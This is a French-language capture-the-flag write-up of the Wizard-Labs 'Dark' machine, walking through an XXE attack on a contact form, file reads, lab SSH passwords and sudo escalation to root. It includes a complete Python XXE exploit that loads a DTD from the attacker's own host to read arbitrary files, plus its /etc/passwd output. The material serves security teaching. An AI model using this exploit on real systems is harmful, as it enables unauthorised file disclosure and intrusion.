# Solution du CTF Dark de Wizard-Labs

Vader
-----

*Dark* est une machine Linux proposée sur [Wizard Labs](https://labs.wizard-security.net/) avec une difficulté donnée à 4/10.  

La machine fait tourner un serveur web avec un formulaire de contact en index :  

![Wizard-Labs Dark CTF index page XXE](https://raw.githubusercontent.com/devl00p/blog/master/images/wizard-labs/dark_index.png)

En regardant le code source de la page on voit que les données sont soumises via Ajax au format XML :  

```javascript
function XMLFunction(){
    var xml = '' +
        '<?xml version="1.0" encoding="UTF-8"?>' +
        '<root>' +
        '<name>' + $('#name').val() + '</name>' +
        '<tel>' + $('#tel').val() + '</tel>' +
        '<email>' + $('#email').val() + '</email>' +
        '<password>' + $('#password').val() + '</password>' +
        '</root>';
    var xmlhttp = new XMLHttpRequest();
    xmlhttp.onreadystatechange = function () {
        if(xmlhttp.readyState == 4){
            console.log(xmlhttp.readyState);
            console.log(xmlhttp.responseText);
            document.getElementById('errorMessage').innerHTML = xmlhttp.responseText;

        }
    }
    xmlhttp.open("POST","process.php",true);
    xmlhttp.send(xml);
}
```

Et qui dit XML... dit potentiellement [XXE](https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing) (surtout sur un CTF évidemment).  

Exploiter des failles de ce type nécessite plus de préparatifs que d'autres failles (inclusion, injection de commandes, etc) alors on se remonte les manches et c'est parti !  

&XXE;
-----

Quand on soumet des données quelconques à ce formulaire on obtient un message d'erreur en retour :  

> Sorry, yolo@nawak.tld is already registered!

On va donc placer nos injections XXE dans le champ correspondant à l'adresse email afin d'exfiltrer les données.  

J'ai repris mon exploit écrit pour le [CTF DevOops de HackTheBox](http://devloop.users.sourceforge.net/index.php?article179/solution-du-ctf-devoops-de-hackthebox) et l'ai adapté pour que le format du XML et sa DTD correspondent aux données attendues.  

```python
import sys

import requests
from requests.exceptions import RequestException
from netifaces import ifaddresses

if len(sys.argv) < 2:
    print("Usage: python {} filename".format(sys.argv[0]))
    exit()

my_ip = ifaddresses("tun0")[2][0]["addr"]
filename = sys.argv[1]

xml = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root SYSTEM "http://{}/valid.dtd">
<root>
<name></name>
<tel></tel>
<email>&xxe;</email>
<password></password>
</root>""".format(my_ip)

dtd = """<?xml version="1.0" encoding="UTF-8" ?>
<!ELEMENT root (name, tel, email, password)>
<!ENTITY xxe SYSTEM "file://{}" >
<!ELEMENT name (#PCDATA)>
<!ELEMENT tel (#PCDATA)>
<!ELEMENT email (#PCDATA)>
<!ELEMENT password (#PCDATA)>""".format(filename)

with open("valid.dtd", "w") as fd:
    fd.write(dtd)

try:
    response = requests.post(
        "http://10.1.1.30/process.php",
        data=xml,
        headers={"content-type": "application/xml"}
    )

except RequestException as exception:
    print("Error occurred:", exception)
else:
    print(response.text)
```

On utilisera un serveur web quelconque (*python3 -m http.server* fait parfaitement l'affaire) pour héberger le fichier DTD qui est automatiquement modifié par l'exploit.  

On peut par exemple récupérer le fichier */etc/passwd*.  

```plain
$ python3 exploit.py /etc/passwd
Sorry, root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
libuuid:x:100:101::/var/lib/libuuid:
syslog:x:101:104::/home/syslog:/bin/false
mysql:x:102:106:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:103:107::/var/run/dbus:/bin/false
landscape:x:104:110::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
dark:x:1000:1000:Dark Lord,,,:/home/dark:/bin/bash
dhcpd:x:106:114::/var/run:/bin/false
lord:x:1001:1001:,,,:/home/lord:/bin/bash
 is already registered
```

On peut voir deux utilisateurs sur le système : *dark* et *lord*.  

J'ai tenté de récupérer les clés privées SSH de ces utilisateurs mais soit le fichier n'est pas présent, soit les permissions ne permettent pas d'y accéder... Il est temps de fouiller un peu plus sur ce serveur web.  

```plain
/img (Status: 301)
/js (Status: 301)
/backup (Status: 301)
/process.php (Status: 200)
```

*Gobuster* rapporte un fichier *backup* qui contient juste le path */home/lord/password\_backup.txt*.  

Grace à notre exploit on peut dumper ce fichier qui contient le mot de passe SSH pour *lord* : *sunnysunshine!5*.  

G0t r00t
--------

On trouve dans le home de l'utilisateur le premier flag ainsi qu'une clé dont on ignore le but :  

```plain
lord@dark:~$ cat user.txt
d38f--- snip ---d422

lord@dark:~$ cat key
jdhauioh38qhdu
```

Toutefois en cherchant les fichiers de l'utilisateur *lord* (avec *find / -type f -user lord -not -path '/proc/\*' 2> /dev/null*) on trouve un binaire à un emplacement incongru :  

```plain
-rwx--x--x 1 lord lord 8664 Oct  6 12:16 /var/tmp/locker
```

Donnons lui ce qu'il demande :  

```plain
lord@dark:~$ /var/tmp/locker
Usage: <key>
lord@dark:~$ /var/tmp/locker jdhauioh38qhdu
Checking License: jdhauioh38qhdu
dark password = supereasypassword101if
```

Grace à ce mot de passe on peux devenir *dark* via *su*. Cet utilisateur fait partie du groupe *sudo*, voyons voir ce que l'on peut faire :  

```plain
dark@dark:~$ sudo -l
[sudo] password for dark:
Matching Defaults entries for dark on dark:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User dark may run the following commands on dark:
    (ALL : ALL) ALL
dark@dark:~$ sudo su
root@dark:/home/dark# cat /root/root.txt
57e8--- snip ---632d3
```

Game over
---------

Toujours sympa ces petites failles XXE, pour le reste du très basique.  

Merci à *sahay* pour la box et [@h4d3sw0rm](https://twitter.com/h4d3sw0rm) pour *Wizard Labs*.

*Published November 17 2020 at 13:48*